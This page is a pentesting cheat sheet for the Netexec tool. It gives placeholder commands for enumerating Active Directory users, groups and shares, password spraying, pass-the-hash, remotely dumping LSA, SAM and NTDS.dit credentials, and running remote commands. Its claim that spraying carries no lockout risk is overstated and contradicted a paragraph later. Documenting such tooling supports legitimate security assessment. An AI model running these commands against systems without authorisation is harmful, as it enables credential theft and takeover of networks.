+++
title = "Netexec"
+++

- https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol

Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks. It's a network exploitation tool that helps automate assessing the security of large networks by providing tactics and techniques for testing security controls in an Active Directory environment.

## Password Policy Enumeration

Enumerate password policy information via SMB:

```bash
# Anonymous password policy enumeration
netexec smb <TARGET> --pass-pol

# Authenticated password policy enumeration
netexec smb <TARGET> -u <USER> -p <PASS> --pass-pol
```

## User Enumeration

### Enumerate Users

```bash
# Enumerate users via SMB (anonymous or authenticated)
netexec smb <TARGET> --users

# Authenticated user enumeration
netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
```

### Enumerate Groups

```bash
# Enumerate groups
netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --groups

# Find high value users (e.g., Domain Admins)
netexec smb <TARGET> -u <USER> -p <PASSWORD> --groups "Domain Admins"
```

## Share Enumeration

```bash
# List available shares
netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
```

## Password Spraying

Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!

**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if you don't know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.

```bash
# Check netexec -h for services
# Password spraying (many users vs 1 password)
netexec smb <TARGET> -u <USERS> -p <PASSWORD> | grep '+'

# Local authentication (tries local authentication instead of domain authentication)
# Mitigated with: <https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview>
netexec smb <TARGET> -u <USERS> -p <PASSWORD> --local-auth | grep '+'
```

## Pass the Hash (PtH)

Netexec supports pass-the-hash attacks for lateral movement:

```bash
# Target can also be a subnet (CIDR)
# -d . = Local Account | -d <DOMAIN> = Domain Account
# --local-auth forces local check if implied domain fails
# :<PASS_HASH> implies empty LM hash (LM:NT)
netexec smb <TARGET> -u <USER> -d . -H <PASS_HASH> --local-auth

# Domain account with hash
netexec smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
```

## Credential Dumping

### LSA Secrets

Remotely dump LSA secrets from a target:

```bash
# Dump LSA secrets remotely
netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
```

### SAM Database

Remotely dump SAM database secrets:

```bash
# Dump SAM secrets remotely
netexec smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
```

## Active Directory Operations

### Verify Credentials

```bash
# Verify credentials against a domain controller
netexec smb <DC_IP> -u <USER> -p <PASSWORD>

# Execute command with verified credentials
sudo netexec smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
```

### NTDS.dit Extraction

Extract the NTDS.dit file (keys of the kingdom) from a domain controller:

```bash
# Extract NTDS.dit using ntdsutil module
netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
```

## LDAP Operations

### Admin Count Enumeration

Find high-value users with adminCount=1 (includes Domain Admins, Enterprise Admins, Backup Operators, etc.):

```bash
# Enumerate users with adminCount=1 via LDAP
netexec ldap <TARGET> -u <USER> -p <PASSWORD> --admin-count
```

## Command Execution

**Command Execution (`-x`, `-X`) or Relaying**: Sudo is **REQUIRED** because these operations act as a **server/listener**.

Execute commands on remote systems:

```bash
# Execute command on target
sudo netexec smb <TARGET> -u <USER> -p <PASSWORD> -x '<COMMAND>'

# Execute command with domain credentials
sudo netexec smb <DC_IP> -u <USER> -p <PASSWORD> -x '<COMMAND>'
```

## Protocol Selection

Netexec supports multiple protocols. Check available services with:

```bash
netexec -h
```

Common protocols include:

- `smb` - SMB/CIFS protocol
- `ldap` - LDAP protocol
- `winrm` - Windows Remote Management
- `ssh` - SSH protocol
- `mssql` - Microsoft SQL Server
- And many more...
